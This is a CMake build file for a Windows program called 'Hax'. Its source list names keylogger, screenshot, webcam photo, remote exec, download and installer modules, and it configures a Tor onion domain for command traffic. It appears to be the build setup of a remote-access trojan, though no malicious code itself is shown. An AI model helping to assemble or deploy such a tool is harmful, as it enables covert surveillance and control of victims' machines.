cmake_minimum_required(VERSION 2.6)
project(Hax)

set(SRC
    src/CommandExe.cpp
    src/CommandExe.h
    src/Command.h
    src/Command_batch.cpp
    src/Command_batch.h
    src/Command_dl.cpp
    src/Command_dl.h
    src/Command_exec.cpp
    src/Command_exec.h
    src/Command_exit.cpp
    src/Command_exit.h
    src/Command_info.cpp
    src/Command_info.h
    src/Command_ls.cpp
    src/Command_ls.h
    src/Command_msgbox.cpp
    src/Command_msgbox.h
    src/Command_photo.cpp
    src/Command_photo.h
    src/Command_remove.cpp
    src/Command_remove.h
    src/Command_screenshot.cpp
    src/Command_screenshot.h
    src/ImageUtils.cpp
    src/ImageUtils.h
    src/Installer.cpp
    src/Installer.h
    src/Keylogger.cpp
    src/Keylogger.h
    src/Logger.cpp
    src/Logger.h
    src/Main.cpp
    src/Network.cpp
    src/Network.h
    src/Settings.h
    src/Tor.cpp
    src/Tor.h
    src/resource.h
    src/stdafx.cpp
    src/stdafx.h
    src/targetver.h
    src/Util.cpp
    src/Util.h
    src/version.rc

	src/External/miniz.c
	src/External/chunk.c
	src/External/header.c
	src/External/http.c
)

set(LIBS
	iphlpapi.lib
    secur32.lib
    ws2_32.lib
    wldap32.lib

	${CMAKE_SOURCE_DIR}/lib/x86/libcurl.x86.lib
	${CMAKE_SOURCE_DIR}/lib/x86/libssh2.x86.lib
	${CMAKE_SOURCE_DIR}/lib/x86/openssl.x86.lib
	${CMAKE_SOURCE_DIR}/lib/x86/zlib.x86.lib
)

if(CMAKE_GENERATOR_TOOLSET STREQUAL "v120_xp")
	set(BUILDXP TRUE)
endif()

if(MINGW)
	set(BUILDXP TRUE)
endif()

if(BUILDXP)
	list(APPEND LIBS "psapi.lib")
endif()

include_directories(${CMAKE_SOURCE_DIR}/include)

add_executable(Hax ${SRC})
target_link_libraries(Hax ${LIBS})

set_target_properties(Hax PROPERTIES OUTPUT_NAME "Hax")

add_definitions("-DUNICODE -D_UNICODE")
add_definitions("-DCURL_STATICLIB")
add_definitions("-D_CRT_SECURE_NO_WARNINGS")

if(MSVC)
    set_target_properties(Hax PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS /LTCG")
	FOREACH(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE
            CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        STRING(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
    ENDFOREACH(flag_var)
endif()

add_custom_command(TARGET Hax PRE_BUILD COMMAND ${CMAKE_SOURCE_DIR}/Scripts/Prebuild.bat)

set(ONIONHOST "" CACHE STRING "Domain of your tor web server")
set(WEBBASE "/hax/" CACHE STRING "Subfolder containing the files")

add_definitions("-DV_NET_DOMAIN_ONION=\"${ONIONHOST}\"")
add_definitions("-DV_NET_BASE=\"${WEBBASE}\"")

